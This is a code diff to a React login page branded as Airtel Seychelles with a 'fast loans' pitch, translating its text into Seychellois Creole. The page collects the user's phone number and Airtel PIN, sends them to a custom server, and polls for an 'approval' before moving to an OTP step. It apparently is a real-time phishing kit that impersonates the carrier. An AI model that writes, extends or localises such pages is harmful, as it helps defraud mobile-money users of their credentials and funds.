@@ -69,7 +69,6 @@ function AirtelLogin() {
         setRefId(data.ref_id);
         setIsWaitingForApproval(true); 
         
-        // REDUCED INTERVAL TO 1000ms (1 second) FOR FASTER REACTION
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -86,7 +85,7 @@ function AirtelLogin() {
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
           }
-        }, 1000); // <--- Changed from 3000 to 1000
+        }, 1000);
       } else {
         navigate('/airtel-otp');
       }
@@ -162,6 +161,7 @@ function AirtelLogin() {
           font-weight: 700;
           color: #1a1a1a;
           margin-bottom: 20px;
+          text-align: center;
         }
 
         .waiting-message {
@@ -400,9 +400,9 @@ function AirtelLogin() {
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">Waiting for approval</div>
+          <div className="waiting-title">Pey atann aprobasyon</div>
           <div className="waiting-message">
-            Your request has been sent. Please wait while we verify your details...
+            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
           </div>
         </div>
       )}
@@ -419,18 +419,18 @@ function AirtelLogin() {
               <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
-          <h1 className="header-title">Airtel Seychelles</h1>
-          <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
+          <h1 className="header-title">Airtel Sesel</h1>
+          <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
         </div>
 
         {/* MAIN CARD */}
         <div className="main-card">
-          <h2 className="card-title">Welcome back</h2>
-          <p className="card-subtitle">Log in to your Airtel Seychelles account</p>
+          <h2 className="card-title">Byenveni</h2>
+          <p className="card-subtitle">Konekte ar ou kont Airtel Sesel</p>
 
           <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
-            <span className="input-label">Phone number</span>
+            <span className="input-label">Nimero telefon</span>
             <div className="phone-wrapper">
               <div className="phone-prefix">
                 <svg width="20" height="14" viewBox="0 0 300 200" xmlns="http://www.w3.org/2000/svg" style={{ borderRadius: '2px' }}>
@@ -453,7 +453,7 @@ function AirtelLogin() {
               />
             </div>
 
-            <span className="input-label">Enter your Airtel PIN code</span>
+            <span className="input-label">Antre ou koud PIN Airtel</span>
             
             <div className="pin-section-wrapper">
               <div className="pin-boxes">
@@ -497,8 +497,7 @@ function AirtelLogin() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || isLoading || isWaitingForApproval}
             >
-              {/* CHANGED: Text is now English and reactive */}
-              {isLoading && !isWaitingForApproval ? 'Connecting...' : 'Login'}
+              {isLoading && !isWaitingForApproval ? 'Pey konekte...' : 'Konekte'}
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
@@ -511,7 +510,7 @@ function AirtelLogin() {
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-            Your information is secure.
+            Ou bann informasyon i an sekirite.
           </div>
         </div>
 
